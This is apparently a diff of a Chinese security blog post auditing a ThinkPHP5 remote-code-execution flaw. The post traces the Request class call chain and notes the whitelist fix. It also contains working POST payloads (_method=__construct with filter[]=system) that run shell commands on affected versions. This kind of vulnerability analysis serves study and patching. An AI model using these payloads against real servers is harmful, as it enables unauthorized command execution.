@@ -1,310 +1,210 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-    <meta name="author" content="p0l1st">
-
-
-
-    <meta name="description" content="blog">
-
-
-
-<title>ThinkPHP5代码审计:代码执行(三) | p0l1st&#39;s blog</title>
-
-
-
-    <link rel="icon" href="/b.png">
-
-
-
-
-    <!-- stylesheets list from _config.yml -->
     
-    <link rel="stylesheet" href="/css/style.css">
+    <title>
+        ThinkPHP5代码审计:代码执行(三) |
+        
+        p0l1st&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="漏洞环境漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.23  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 不同版本的payload稍作调整 # ThinkPHP &lt;&#x3D; 5.0.13 POST &#x2F;?s&#x3D;index&#x2F;index s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP5代码审计:代码执行(三)">
+<meta property="og:url" content="http://example.com/2024/07/01/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%89/index.html">
+<meta property="og:site_name" content="p0l1st&#39;s blog">
+<meta property="og:description" content="漏洞环境漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.23  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 不同版本的payload稍作调整 # ThinkPHP &lt;&#x3D; 5.0.13 POST &#x2F;?s&#x3D;index&#x2F;index s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817665.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817051.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817664.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817911.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817829.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817708.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817981.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817254.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817666.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817184.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817331.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818216.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818588.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818236.png">
+<meta property="og:image" content="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/12.png">
+<meta property="article:published_time" content="2024-07-01T07:12:38.000Z">
+<meta property="article:modified_time" content="2024-08-22T10:18:21.886Z">
+<meta property="article:author" content="p0l1st">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817665.png">
     
-
-
-
-    <!-- scripts list from _config.yml -->
-    
-    <script src="/js/script.js"></script>
-    
-    <script src="/js/tocbot.min.js"></script>
-    
-
-
-
     
     
         
+            <link rel="stylesheet" href="http://example.com/css/markdown.css">
+        
+            <link rel="stylesheet" href="http://example.com/css/july.css">
+        
     
-
-
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
 </head>
-
 <body>
-    <script>
-        // this function is used to check current theme before page loaded.
-        (() => {
-            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
-            const isDark = currentTheme === 'dark';
-            const pagebody = document.getElementsByTagName('body')[0]
-            if (isDark) {
-                pagebody.classList.add('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
-            } else {
-                pagebody.classList.remove('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Light"
-            }
-        })();
-    </script>
 
-    <div class="wrapper">
-        <header>
-    <nav class="navbar">
-        <div class="container">
-            <div class="navbar-header header-logo"><a href="/">p0l1st&#39;s Blog</a></div>
-            <div class="menu navbar-right">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-                    <a class="menu-item" href="/links">Links</a>
-                
-                <input id="switch_default" type="checkbox" class="switch_default">
-                <label for="switch_default" class="toggleBtn"></label>
-            </div>
-        </div>
-    </nav>
+<div id="banner-outer" class="hidden">
+    <div id="banner-image" style="background-image: url()"></div>
+    <img src="https://www.gravatar.com/avatar/7a585313ed855e8d652cbb3154a6056e?s=300&amp;d=mm&amp;r=g" id="avatar">
+</div>
 
-    
-    <nav class="navbar-mobile" id="nav-mobile">
-        <div class="container">
-            <div class="navbar-header">
-                <div>
-                    <a href="/">p0l1st&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
-                </div>
-                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
-            </div>
-            <div class="menu" id="mobile-menu">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-                    <a class="menu-item" href="/links">Links</a>
-                
-            </div>
-        </div>
-    </nav>
-
-</header>
-<script>
-    var mobileBtn = function f() {
-        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
-        var mobileMenu = document.getElementById("mobile-menu");
-        if(toggleMenu.classList.contains("active")){
-           toggleMenu.classList.remove("active")
-            mobileMenu.classList.remove("active")
-        }else{
-            toggleMenu.classList.add("active")
-            mobileMenu.classList.add("active")
-        }
-    }
-</script>
-            <div class="main">
-                <div class="container">
-    
-    
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
+<div id="menu-outer">
+    <div id="menu-inner">
+        
+            <a class="false" href="http://example.com/index.html">Home</a>
+        
+            <a class="false" href="http://example.com/archives/index.html">Archives</a>
+        
+            <a class="false" href="http://example.com/about/index.html">About</a>
+        
     </div>
 </div>
 
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
-
-    
-    <article class="post-wrap">
-        <header class="post-header">
-            <h1 class="post-title">ThinkPHP5代码审计:代码执行(三)</h1>
-            
-                <div class="post-meta">
-                    
-                        Author: <a itemprop="author" rel="author" href="/">p0l1st</a>
-                    
-
-                    
-                        <span class="post-time">
-                        Date: <a href="#">July 1, 2024&nbsp;&nbsp;15:12:38</a>
-                        </span>
-                    
-                    
-                </div>
-            
-        </header>
-
-        <div class="post-content">
-            <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.23  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</p>
+<div id="content-outer" class="container">
+    <div id="content-inner">
+        <article id="post">
+    <h1 id="post-title">ThinkPHP5代码审计:代码执行(三)</h1>
+    <time id="post-date" datetime="2024-07-01T07:12:38.000Z">
+        July 01, 2024
+    </time>
+    <div id="post-content" class="markdown-body">
+        <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.23  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</p>
 <p>不同版本的payload稍作调整</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;= 5.0.13</span><br><span class="line">POST /?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span><br><span class="line">POST /</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST /?s=xxx HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
+<pre><code># ThinkPHP &lt;= 5.0.13
+POST /?s=index/index
+s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system
 
+# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug
+POST /
+_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al
+
+# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha
+POST /?s=xxx HTTP/1.1
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls
+</code></pre>
 <p>ThinkPHP 5.0.23</p>
-<p><img src="/../images/image-20240701151605981.png" alt="image-20240701151605981"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817665.png" alt="image-20240701151605981"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>官方发布的5.0.24版本更新中，提到本次更新包含了一个安全更新</p>
 <p>查询commit记录</p>
-<p><img src="/../images/image-20240701152553590.png" alt="image-20240701152553590"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817051.png" alt="image-20240701152553590"></p>
 <p>可以看到$method来自可控的POST数组，并且没有任何过滤，直接把它作为Request类的方法进行调用。同时该方法传入的参数可控，也就是说可以随意调用Request类的部分方法。</p>
-<p><img src="/../images/image-20240701153224596.png" alt="image-20240701153224596"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817664.png" alt="image-20240701153224596"></p>
 <p>并且Request类的_construct方法中存在类属性覆盖</p>
-<p><img src="/../images/image-20240701153712371.png" alt="image-20240701153712371"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817911.png" alt="image-20240701153712371"></p>
 <p>Request类的所有属性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected $get                  protected static $instance;</span><br><span class="line">protected $post                 protected $method;</span><br><span class="line">protected $request              protected $domain;</span><br><span class="line">protected $route                protected $url;</span><br><span class="line">protected $put;                 protected $baseUrl;</span><br><span class="line">protected $session              protected $baseFile;</span><br><span class="line">protected $file                 protected $root;</span><br><span class="line">protected $cookie               protected $pathinfo;</span><br><span class="line">protected $server               protected $path;</span><br><span class="line">protected $header               protected $routeInfo </span><br><span class="line">protected $mimeType             protected $env;</span><br><span class="line">protected $content;             protected $dispatch </span><br><span class="line">protected $filter;              protected $module;</span><br><span class="line">protected static $hook          protected $controller;</span><br><span class="line">protected $bind                 protected $action;</span><br><span class="line">protected $input;               protected $langset;</span><br><span class="line">protected $cache;               protected $param   </span><br><span class="line">protected $isCheckCache;    </span><br></pre></td></tr></table></figure>
-
+<pre><code>protected $get                  protected static $instance;
+protected $post                 protected $method;
+protected $request              protected $domain;
+protected $route                protected $url;
+protected $put;                 protected $baseUrl;
+protected $session              protected $baseFile;
+protected $file                 protected $root;
+protected $cookie               protected $pathinfo;
+protected $server               protected $path;
+protected $header               protected $routeInfo 
+protected $mimeType             protected $env;
+protected $content;             protected $dispatch 
+protected $filter;              protected $module;
+protected static $hook          protected $controller;
+protected $bind                 protected $action;
+protected $input;               protected $langset;
+protected $cache;               protected $param   
+protected $isCheckCache;    
+</code></pre>
 <p>继续跟进，发现如果框架在配置文件中开启了debug模式，那么程序就会调用Request类的param方法，而这个方法又调用了filterValue方法，就可以利用call_user_func函数</p>
-<p><img src="/../images/image-20240701154108578.png" alt="image-20240701154108578"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817829.png" alt="image-20240701154108578"></p>
 <p>跟进param方法，发现调用了method方法，method方法又会调用server方法，而在server方法中把$this-&gt;server传入了input方法。</p>
-<p><img src="/../images/image-20240701154355978.png" alt="image-20240701154355978"></p>
-<p><img src="/../images/image-20240701154806961.png" alt="image-20240701154806961"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817708.png" alt="image-20240701154355978"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817981.png" alt="image-20240701154806961"></p>
 <p>$this-&gt;server的值，可以通过先前Request类的_construct方法来覆盖，也就是说$data可控传入input方法然后$data会被filterValue方法使用$filter过滤器处理，其中$filter的值部分来自$this-&gt;filter，又可以使用Request类的_construct方法来覆盖</p>
-<p><img src="/../images/image-20240701155339102.png" alt="image-20240701155339102"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817254.png" alt="image-20240701155339102"></p>
 <p>接下来就是filterValue方法调用call_user_func处理数据，产生代码执行</p>
-<p><img src="/../images/image-20240701155519537.png" alt="image-20240701155519537"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817666.png" alt="image-20240701155519537"></p>
 <p>上面讲的是开启debug触发RCE，那我们再来看看没有开启debug，怎么利用该漏洞。</p>
 <p>在run方法中，会执行一个exec方法，当该方法中的$dispatch[‘type’]等于controller或者method时，又会调用Request类的param方法</p>
-<p><img src="/../images/image-20240701160006568.png" alt="image-20240701160006568"></p>
-<p><img src="/../images/image-20240701160036398.png" alt="image-20240701160036398"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817184.png" alt="image-20240701160006568"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817331.png" alt="image-20240701160036398"></p>
 <p>再跟进Request类的param方法，后面的调用过程和前面一样，不再赘述</p>
-<p><img src="/../images/image-20240701160205974.png" alt="image-20240701160205974"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818216.png" alt="image-20240701160205974"></p>
 <p>我们还要解决一个问题，怎么让$dispatch[‘type’]等于controller或者method。跟进发现$dispatch[‘type’]来源于parseRule方法中的$result变量，而$result变量又与$route变量有关系，$route取决于程序中定义的路由地址方式</p>
-<p><img src="/../images/image-20240701161149424.png" alt="image-20240701161149424"></p>
-<p><img src="/../images/image-20240701161448663.png" alt="image-20240701161448663"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818588.png" alt="image-20240701161149424"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818236.png" alt="image-20240701161448663"></p>
 <p>在ThinkPHP5完整版中，定义了验证码类的路由地址。程序在初始化时，通过类自动机制，将vendor目录下的文件加载，然后GET方式中就多了这一条路由，我们可以利用这一路由地址使得$dispatch[‘type’]等于method，进而触发RCE。</p>
 <p>最终payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha </span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al</span><br><span class="line"># 或者</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code>POST /index.php?s=captcha 
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al
+# 或者
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls
+</code></pre>
 <h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>对请求方法$method进行白名单校验</p>
 <h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/12.png" alt="12"></p>
 
-        </div>
+    </div>
+</article>
 
-        
-            <section class="post-copyright">
-                
-                
-                
-                
-
-            </section>
-        
-        <section class="post-tags">
-            <div>
-                <span>Tag(s):</span>
-                <span class="tag">
-                    
-                    
-                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
-                    
-                        
-                </span>
-            </div>
-            <div>
-                <a href="javascript:window.history.back();">back</a>
-                <span>· </span>
-                <a href="/">home</a>
-            </div>
-        </section>
-        <section class="post-nav">
-            
-                <a class="prev" rel="prev" href="/2024/07/08/ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">ThinkPHP5.1.X反序列化利用链</a>
-            
-            
-            <a class="next" rel="next" href="/2024/06/12/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/">ThinkPHP5代码审计:代码执行(二)</a>
-            
-        </section>
-
-
-    </article>
+<div id="paginator">
+    
 </div>
 
-            </div>
-            <footer id="footer" class="footer">
-    <div class="copyright">
-        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-</footer>
+</div>
 
+<div id="bottom-outer">
+    <div id="bottom-inner">
+        2019-2024 p0l1st 皖ICP备16011445号
     </div>
+</div>
+
+<div id="to-top">
+    <i class="iconfont icon-up"></i>
+</div>
+
+
+    
+        <script src="http://example.com/js/jquery-3.4.1.min.js"></script>
+    
+        <script src="http://example.com/js/highlight-9.13.1.min.js"></script>
+    
+        <script src="http://example.com/js/transition.js"></script>
+    
+        <script src="http://example.com/js/smooth-scroll.min.js"></script>
+    
+
+
+
+    <script>
+      $(function () {
+        $('#banner-outer').addClass('fade-out')
+        $('#menu-outer').addClass('fade-show')
+
+        $('pre').each(function (i, block) {
+          hljs.highlightBlock(block);
+        });
+      })
+    </script>
+
+
+<script>
+  $(function () {
+    $(window).scroll(function () {
+      if ($(window).scrollTop() > 150) {
+        $("#to-top").fadeIn();
+      } else {
+        $("#to-top").fadeOut();
+      }
+    });
+    $("#to-top").click(function () {
+      $("body,html").animate({scrollTop: 0}, 500);
+      return false;
+    })
+  })
+</script>
 </body>
-
 </html>
